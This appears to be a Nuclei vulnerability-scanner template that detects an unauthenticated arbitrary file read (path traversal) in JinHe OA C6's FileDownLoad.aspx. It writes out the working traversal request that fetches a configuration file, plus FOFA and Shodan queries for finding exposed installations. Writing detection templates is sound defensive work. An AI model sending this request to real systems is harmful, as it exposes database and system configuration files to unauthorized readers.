http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - '[JHFile]'
    - FolderTotal
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini'
id: jinhe-oa-c6-filedownload-lfi
info:
  author: Co5mos
  classification:
    cwe-id: CWE-22
  description: 'JinHe OA C6 FileDownLoad.aspx interface exists an arbitrary file read
    vulnerability, unauthenticated attackers can read important system files (such
    as database configuration files, system configuration files), database configuration
    files, etc., causing the website to be in an extremely insecure state.

    '
  metadata:
    fofa-query: "app=\"\u91D1\u548C\u7F51\u7EDC-\u91D1\u548COA\""
    shodan-query: http.html:"/jc6/platform/sys/login"
  name: JinHe OAC6 FileDownLoad.aspx - Local File Inclusion
  severity: high
  tags: jinhe,lfi
